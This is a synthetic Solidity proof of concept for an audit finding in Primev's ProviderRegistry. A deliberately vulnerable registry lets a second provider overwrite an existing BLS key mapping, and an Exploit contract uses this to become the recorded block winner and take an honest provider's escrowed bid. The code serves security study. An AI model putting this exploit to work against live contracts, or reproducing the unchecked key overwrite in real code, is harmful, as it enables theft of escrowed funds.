// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Primev — blockBuilderBLSKeyToAddress can be overwritten (Cantina)
    SYNTHETIC, cheatcode-free reduction of ProviderRegistry._registerAndStake.
    The assignment does not revert when the 48-byte key is already mapped.
    A second registrant becomes the L1 winner and collects the escrowed bid
    the honest provider's key had earned. */

contract ERC20 {
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s, uint8 d) {
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract ProviderRegistry {
    mapping(bytes => address) public blockBuilderBLSKeyToAddress;
    mapping(address => uint256) public providerStakes;
    mapping(address => bool) public providerRegistered;
    uint256 public minStake;

    constructor(uint256 m) {
        minStake = m;
    }

    function registerAndStake(bytes[] calldata blsPublicKeys) external payable {
        _registerAndStake(msg.sender, blsPublicKeys);
    }

    function _registerAndStake(address provider, bytes[] calldata blsPublicKeys) internal {
        require(!providerRegistered[provider], "registered");
        require(msg.value >= minStake, "stake");
        require(blsPublicKeys.length != 0, "keys");
        uint256 numKeys = blsPublicKeys.length;
        for (uint256 i = 0; i < numKeys; ++i) {
            bytes memory key = blsPublicKeys[i];
            require(key.length == 48, "len");
            blockBuilderBLSKeyToAddress[key] = provider; // @> VULN: an existing BLS key is overwritten
        }
        providerStakes[provider] = msg.value;
        providerRegistered[provider] = true;
    }

    function getEoaFromBLSKey(bytes calldata blsKey) external view returns (address) {
        return blockBuilderBLSKeyToAddress[blsKey];
    }
}

contract BlockTracker {
    ProviderRegistry public registry;
    mapping(uint256 => address) public winnerOf;

    constructor(ProviderRegistry r) {
        registry = r;
    }

    function recordL1Block(uint256 blockNumber, bytes calldata winnerBLSKey) external {
        address winner = registry.getEoaFromBLSKey(winnerBLSKey); // S4 recorded winner is the overwritten address
        winnerOf[blockNumber] = winner;
    }
}

contract Commitment {
    BlockTracker public tracker;
    ERC20 public token;
    mapping(uint256 => uint256) public escrow;

    constructor(BlockTracker t, ERC20 tok) {
        tracker = t;
        token = tok;
    }

    function lockBid(uint256 blockNumber, uint256 amt) external {
        token.transferFrom(msg.sender, address(this), amt);
        escrow[blockNumber] = amt;
    }

    function openCommitment(uint256 blockNumber) external {
        address winner = tracker.winnerOf(blockNumber);
        require(msg.sender == winner, "not winner");
        uint256 amt = escrow[blockNumber];
        escrow[blockNumber] = 0;
        token.transfer(winner, amt); // S6 bid paid to the recorded winner
    }
}

contract Honest {
    function register(ProviderRegistry r, bytes[] calldata keys) external payable {
        r.registerAndStake{value: msg.value}(keys); // S1
    }

    function open(Commitment c, uint256 blockNumber) external {
        c.openCommitment(blockNumber);
    }
}

contract Bidder {
    function lock(Commitment c, ERC20 token, uint256 blockNumber, uint256 amt) external {
        token.approve(address(c), amt);
        c.lockBid(blockNumber, amt); // S2
    }
}

contract Exploit {
    uint256 public constant FINDING = 46245;
    uint256 public constant STAKE = 0.1 ether;
    uint256 public constant BID = 10 ether;
    ERC20 public token;
    ProviderRegistry public registry;
    BlockTracker public tracker;
    Commitment public commitment;
    Honest public honest;
    Bidder public bidder;
    bool public honestBlocked;

    constructor() {
        token = new ERC20("BID", 18);
        registry = new ProviderRegistry(STAKE);
        tracker = new BlockTracker(registry);
        commitment = new Commitment(tracker, token);
        honest = new Honest();
        bidder = new Bidder();
    }

    function run() external payable {
        require(msg.value == STAKE * 2, "value");
        bytes[] memory keys = new bytes[](1);
        keys[0] = abi.encodePacked(bytes32(uint256(0x1111)), bytes16(uint128(0x2222)));
        honest.register{value: STAKE}(registry, keys);
        token.mint(address(bidder), BID);
        bidder.lock(commitment, token, 1, BID);
        registry.registerAndStake{value: STAKE}(keys); // S3 second provider, same key
        tracker.recordL1Block(1, keys[0]);
        require(tracker.winnerOf(1) == address(this), "winner");
        try honest.open(commitment, 1) {
            revert("honest paid");
        } catch {
            honestBlocked = true; // S5 honest provider is not the winner
        }
        commitment.openCommitment(1);
        require(honestBlocked, "honest not blocked");
        require(token.balanceOf(address(this)) == BID, "stole bid");
        require(token.balanceOf(address(honest)) == 0, "honest empty");
        require(registry.getEoaFromBLSKey(keys[0]) == address(this), "key");
    }
}
